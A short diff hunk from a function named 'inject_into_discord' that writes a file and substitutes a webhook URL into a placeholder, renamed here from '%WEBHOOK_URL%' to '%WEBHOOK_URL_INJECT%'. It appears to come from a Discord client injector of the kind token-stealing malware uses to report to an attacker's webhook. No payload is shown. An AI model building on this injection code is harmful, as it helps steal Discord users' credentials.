@@ -50,7 +50,7 @@ def inject_into_discord():
         with open(new_file_path, 'w') as file:
             file.write(file_content)
 
-        search_text = "%WEBHOOK_URL%"
+        search_text = "%WEBHOOK_URL_INJECT%"
         replace_text = webhook_url
         with open(new_file_path, 'r') as file:
             data = file.read()
